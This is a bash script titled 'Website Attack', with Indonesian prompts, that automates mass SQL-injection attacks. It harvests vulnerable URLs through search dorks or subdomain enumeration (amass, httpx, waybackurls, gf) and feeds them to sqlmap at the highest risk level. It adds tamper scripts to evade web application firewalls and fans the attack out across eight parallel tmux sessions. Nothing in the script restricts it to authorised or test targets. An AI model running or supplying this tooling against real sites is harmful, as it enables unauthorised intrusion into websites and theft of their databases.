#!/bin/bash
banner Website Attack;
echo "0 : Result vulnerable Website"
echo "1 : Vulnerable Dork"
echo "2 : Domain Attack (warning: tua menunggu)"
echo "3 : Single attack"
read -p "Pilih Serangan :" att
if [ $att != 0 ] && [ $att -lt 4 ]
then
echo "Enter Target (domain) [url for single attack]: "
read target


#udork
sqli=$target
sqli+="sqli.txt"

#amass 
sub=$target
sub+="sub.txt"
brute=$target
brute+="brute.txt"

#udork 
 if [ $att -eq 1 ]
 then

 url=$target
 udork $url -f dork -p 100 -vv | grep -i "=" | grep -i "^h" | tee /tmp/$sqli
 sqlmap -m /tmp/$sqli --random-agent --level 3 --risk 3 --batch --answer "follow=N" --tamper="space2comment,xforwardedfor"
 rm -f /tmp/$sqli



#amass

 elif [ $att -eq 2 ]
 then
 amass enum -brute -min-for-recursive 2 -d $target | tee  /tmp/$sub ; cat  /tmp/$sub | httpx -verbose | anew | waybackurls | gf sqli | unew -combine | tee /tmp/$brute
#new



count=$(cat /tmp/$brute | wc -l)
#count=$(cat ~/brute.txt | wc -l)
vsplit=$((( $count / 8 )+ ($count % 8 > 0)))
last=$vsplit
increment=$vsplit
start=1
ttarget=${target//./}
tmux new -d -s $ttarget
for(( c=1; c<=8; c++ ))
do
br=$c
webarg=$target
webarg1=${target//./}
webarg1+=$br
webarg+=$br
echo $last
last+="p"
tmux new-window -t $ttarget:$c -n $webarg1	
sed -n $start,$last /tmp/$brute |tee /tmp/$webarg

#tmux

tmux send -t $ttarget:$webarg1 'sqlmap -m /tmp/'$webarg' --random-agent  --level 3 --risk 3 --batch --answer "follow=N" --tamper="between,randomcase,space2comment,xforwardedfor" -v 3 --skip-waf' ENTER




 
start=$(($start+$vsplit))
last=${last::-1}
last=$(($last+$vsplit))
webarg=${webarg::-1}

done
 




#rm -f /tmp/$sub
# rm -f /tmp/$brute

#single_attack
 elif [ $att -eq 3 ]
 then
 sqlmap -u $target --random-agent --level 1 --risk 3 --batch --answer "follow=N" --tamper="space2comment,xforwardedfor"
 else
echo "mampus"
 fi 

elif [ $att -eq 0 ]
 then
cat ~/.local/share/sqlmap/output/results* | stdbuf -o0 grep -vE 'Target|unexploitable'
else
echo "exit"
exit 1
fi
